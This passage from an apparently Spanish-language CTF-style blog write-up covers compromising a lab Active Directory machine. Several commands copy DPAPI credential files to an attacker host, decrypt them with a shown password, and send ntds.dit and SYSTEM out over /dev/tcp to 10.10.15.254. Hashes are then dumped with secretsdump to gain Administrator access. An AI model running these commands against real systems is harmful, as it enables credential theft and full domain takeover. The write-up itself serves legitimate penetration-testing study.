+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">net</span> <span class="n">use</span> <span class="n">x:</span> <span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">15</span><span class="p">.</span><span class="mf">254</span><span class="p">\</span><span class="n">smbFolder</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">borhub</span> <span class="n">borhub</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">copy </span><span class="n">C:</span><span class="p">\</span><span class="n">IT</span><span class="p">\</span><span class="nb">Second-Line</span> <span class="n">Support</span><span class="p">\</span><span class="n">Archived</span> <span class="n">Users</span><span class="p">\</span><span class="n">todd</span><span class="p">.</span><span class="n">wolfe</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Protect</span><span class="p">\</span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">3927696377</span><span class="p">-</span><span class="mf">1337352550</span><span class="p">-</span><span class="mf">2781715495</span><span class="p">-</span><span class="mf">1110</span> <span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">15</span><span class="p">.</span><span class="mf">254</span><span class="p">\</span><span class="n">smbFolder</span>
+</span></span><span class="line"><span class="cl"><span class="nb">copy </span><span class="n">C:</span><span class="p">\</span><span class="n">IT</span><span class="p">\</span><span class="nb">Second-Line</span> <span class="n">Support</span><span class="p">\</span><span class="n">Archived</span> <span class="n">Users</span><span class="p">\</span><span class="n">todd</span><span class="p">.</span><span class="n">wolfe</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Credentials</span><span class="p">\</span><span class="n">772275FAD58525253490A9B0039791D3</span> <span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">15</span><span class="p">.</span><span class="mf">254</span><span class="p">\</span><span class="n">smbFolder</span><span class="p">\</span>
+</span></span></code></pre></div><p><img alt="Voleur Machine 22" loading="lazy" src="/img/voleur/voleur_machine_22.png"></p>
+<p>Y ahora ya tengo el archivo en mi maquina linux. Entonces procedo a desencryptar el archivo y me da la key:
+<code>0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password <span class="s1">&#39;NightT1meP1dg3on14&#39;</span> -sid S-1-5-21-3927696377-1337352550-2781715495-1110
+</span></span></code></pre></div><p><img alt="Voleur Machine 23" loading="lazy" src="/img/voleur/voleur_machine_23.png"></p>
+<p>Ahora tenemos tanto el archivo encryptado como la llave para descifrarlo, vamos a obtener las posibles credenciales que el archivo tenga almacenadas.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+</span></span></code></pre></div><p><img alt="Voleur Machine 24" loading="lazy" src="/img/voleur/voleur_machine_24.png"></p>
+<p>Es entonces cuando descubrimos las credenciales de jeremy.combs. Y ahora, sacamos un Ticket Garanting Ticket (TGT) para este usuario, ya que hemos visto que tiene permisos de inicio de sesión remota y vamos a enumerar el sistema.</p>
+<p><img alt="Voleur Machine 25" loading="lazy" src="/img/voleur/voleur_machine_25.png"></p>
+<h1 id="escalada-de-privilegios">Escalada de Privilegios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privilegios">#</a></h1>
+<p>Anteriormente habíamos visto que la carpeta IT, estaba dividida en tres carpetas una para cada tipo de técnico.</p>
+<p><img alt="Voleur Machine 26" loading="lazy" src="/img/voleur/voleur_machine_26.png"></p>
+<p>Seguramente y como Jeremy es miembro de <code>Third-Line Suppport</code>, tendremos permisos para acceder a la carpeta de su grupo. Dentro de esa carpeta tenemos varios archivos e directorios interesantes. Enumerándolos veo que no tengo permiso para acceder a la carpeta Backups, pero vamos a descargarnos los archivos <code>id_rsa</code> y <code>Note.txt.txt</code>.</p>
+<p><img alt="Voleur Machine 27" loading="lazy" src="/img/voleur/voleur_machine_27.png"></p>
+<p>Usando <code>download</code> que nos da evilwinrm, nos los descargamos a nuestra máquina local. Si comprobamos que dice la nota de texto que hemos encontrado, vemos que el admin le dice a Jeremy que ha tenido suficiente con los backups de windows y que ha configurado parcialmente <code>WSL</code> para intentar utilizar alguna de las <code>herramientas de copia de seguridad de Linux</code>.</p>
+<p><img alt="Voleur Machine 28" loading="lazy" src="/img/voleur/voleur_machine_28.png"></p>
+<blockquote>
+<p>[!Subsistema de Windows para Linux]
+WSL (Subsistema de Windows para Linux) es una característica de Windows que permite ejecutar un entorno Linux en una máquina Windows sin necesidad de una máquina virtual independiente o un dualboot.</p>
+</blockquote>
+<ul>
+<li>WSL redirige los puertos SSH a los puertos 2222, 22222, 2223.</li>
+</ul>
+<p>En el escaneo de puertos habíamos visto que el puerto 2222 estaba abierto con lo cual vamos a iniciar sesión por ssh con la clave privada seguramente del usuario svc_backup que se mencionaba en el el archivo excel.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod <span class="m">600</span> id_rsa
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ssh -i id_rsa svc_backup@10.10.11.76 -p <span class="m">2222</span>
+</span></span></code></pre></div><p><img alt="Voleur Machine 29" loading="lazy" src="/img/voleur/voleur_machine_29.png"></p>
+<h2 id="abusando-de-wsl-parcialmente-configurado-para-obtener-archivos-sensibles">Abusando de WSL parcialmente configurado para obtener archivos sensibles<a hidden class="anchor" aria-hidden="true" href="#abusando-de-wsl-parcialmente-configurado-para-obtener-archivos-sensibles">#</a></h2>
+<p>Ahora si hacemos sudo su, vemos que tenemos la capacidad de ponernos como root. Y como WSL monta automáticamente los discos de Windows en <code>/mnt/</code> vamos a explorarlos.</p>
+<p><img alt="Voleur Machine 30" loading="lazy" src="/img/voleur/voleur_machine_30.png"></p>
+<p>Primero voy a empezar revisando la carpeta Backup a la cual antes no teníamos permiso para acceder. En esa carpeta vemos tanto que tenemos tanto el archivo ntds.din como el archivo SYSTEM.</p>
+<p><img alt="Voleur Machine 31" loading="lazy" src="/img/voleur/voleur_machine_31.png"></p>
+<ul>
+<li><code>   ntds.dit</code> -&gt; Es el archivo que contiene todos los hashes del dominio.</li>
+<li><code>SYSTEM</code> -&gt; Contiene la <code>bootkey</code> (clave maestra) que se usa para descrifrar los hashes almacenados en el archivo ntds.dit.</li>
+</ul>
+<h3 id="extracción-de-hashes-ntlmlm---secretsdumppy">Extracción de hashes NTLM/LM - secretsdump.py<a hidden class="anchor" aria-hidden="true" href="#extracción-de-hashes-ntlmlm---secretsdumppy">#</a></h3>
+<p>Con lo cual nos los descargamos usando los siguientes comandos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Nos transferimos el contenido del ntds.dit a nuestra máquina usando cat y guardandolo en ntds.dit</span>
+</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span> &gt; ntds.dit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bash -c <span class="s1">&#39;cat ntds.dit &gt; /dev/tcp/10.10.15.254/4444&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span> &gt; SYSTEM
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bash -c <span class="s1">&#39;cat SYSTEM &gt; /dev/tcp/10.10.15.254/4444&#39;</span>
+</span></span></code></pre></div><p><img alt="Voleur Machine 32" loading="lazy" src="/img/voleur/voleur_machine_32.png"></p>
+<p>Ahora una vez descargados con secretsdump.py extraemos los hashes NTLM/LM.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+</span></span></code></pre></div><p><img alt="Voleur Machine 33" loading="lazy" src="/img/voleur/voleur_machine_33.png"></p>
+<p>Ahora con el hash NTLM/LM de Administrator le solicitamos el Ticket Garanting Ticket(TGT), lo exportamos y procedemos a iniciar sesión a través de evil-winrm como administradores del sistema.</p>
+<p><img alt="Voleur Machine 34" loading="lazy" src="/img/voleur/voleur_machine_34.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://borhuub.github.io/tags/medium/">Medium</a></li>
+      <li><a href="https://borhuub.github.io/tags/activedirectory/">ActiveDirectory</a></li>
+      <li><a href="https://borhuub.github.io/tags/ntlm-deshabilitada/">NTLM-Deshabilitada</a></li>
+      <li><a href="https://borhuub.github.io/tags/kerberoasting/">Kerberoasting</a></li>
+      <li><a href="https://borhuub.github.io/tags/runascs/">RunasCs</a></li>
+      <li><a href="https://borhuub.github.io/tags/restore-adobject/">Restore-ADObject</a></li>
+      <li><a href="https://borhuub.github.io/tags/dpapi/">DPAPI</a></li>
+      <li><a href="https://borhuub.github.io/tags/wsl/">WSL</a></li>
+      <li><a href="https://borhuub.github.io/tags/secretsdump/">Secretsdump</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://borhuub.github.io/writeups/tombwatcher/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Tombwatcher</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://borhuub.github.io/">Borhub Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
